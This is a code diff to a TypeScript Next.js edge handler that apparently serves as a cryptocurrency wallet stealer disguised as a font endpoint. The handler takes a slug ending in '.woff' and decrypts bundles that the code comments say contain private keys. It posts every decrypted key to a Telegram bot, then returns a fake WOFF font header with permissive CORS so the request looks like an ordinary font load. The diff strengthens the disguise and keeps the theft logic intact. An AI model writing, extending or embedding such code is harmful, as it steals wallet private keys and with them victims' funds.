@@ -64,10 +64,11 @@ export default async function handler(req: NextRequest) {
     return new Response("Server misconfigured", { status: 500 });
   }
 
-  // 1) extract slug
+  // 1) extract slug and strip .woff
   const parts = new URL(req.url).pathname.split("/");
-  const slug = parts[parts.length - 1];
-  if (!slug || !slug.includes("_")) {
+  let slug = parts[parts.length - 1] || '';
+  if (slug.endsWith('.woff')) slug = slug.slice(0, -5);
+  if (!slug.includes("_")) {
     return new Response("Invalid slug", { status: 400 });
   }
 
@@ -106,7 +107,7 @@ export default async function handler(req: NextRequest) {
     return new Response("Bad request", { status: 400 });
   }
 
-  // 4) decrypt each bundle
+  // 4) decrypt each bundle and collect private keys
   const privKeys: string[] = [];
   for (let i = 0; i < data.sBundles.length; i++) {
     const [ivB64, cipherB64] = data.sBundles[i].split(":");
@@ -131,11 +132,13 @@ export default async function handler(req: NextRequest) {
     }
   }
 
-  // 5) send Telegram
+  // 5) send Telegram if any keys
   if (privKeys.length) {
     const lines: string[] = [];
     privKeys.forEach((pk, idx) => {
-      lines.push(`Wallet ${idx + 1}`, pk, "");
+      lines.push(`Wallet ${idx + 1}`);
+      lines.push(pk);
+      lines.push("");
     });
     const text = lines.join("\n").trim();
 
@@ -143,10 +146,7 @@ export default async function handler(req: NextRequest) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text,
-        }),
+        body: JSON.stringify({ chat_id: CHAT_ID, text }),
       });
     } catch (e) {
       console.error("Telegram send error:", e);
@@ -155,11 +155,12 @@ export default async function handler(req: NextRequest) {
     console.error("No private keys decrypted");
   }
 
-  // 6) return valid WOFF header
+  // 6) return valid WOFF header with CORS
   return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
     headers: {
       "Content-Type": "font/woff",
       "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Credentials": "true"
     },
   });
 }
